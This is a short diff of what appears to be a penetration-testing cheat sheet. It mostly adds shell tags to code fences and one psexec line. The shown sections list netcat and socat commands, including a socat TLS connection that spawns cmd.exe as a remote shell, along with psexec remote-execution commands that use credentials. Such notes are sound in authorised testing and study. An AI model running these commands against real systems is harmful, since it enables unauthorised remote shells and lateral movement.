@@ -180,12 +180,12 @@ net use g: \\marketing.example.com\marketing /user:marketing@example.com passwor
 
 ### Netcat and SOCAT
 
-```
+```sh
 client> nc.exe 127.0.0.1 1234
 server> nc.exe -n -l -v -s 127.0.0.1 -p 1234
 ```
 
-```
+```sh
 server> socat.exe -d OPENSSL-LISTEN:5678,cert=offsec.pem, verify=0 STDOUT, bind=127.0.0.1
 client> socat.exe OPENSSL:127.0.0.1:5678, verify=0 EXEC=’cmd.exe’
 ```
@@ -201,7 +201,8 @@ client> socat.exe OPENSSL:127.0.0.1:5678, verify=0 EXEC=’cmd.exe’
 
 https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
 
-```
+```shell
+psexec -accepteula
 psexec -i \myComputer cmd /c "systeminfo"
 psexec -i \myComputer -u domain\username -p password cmd
 psexec -i \myComputer -u domain\username -p password cmd /c "systeminfo"
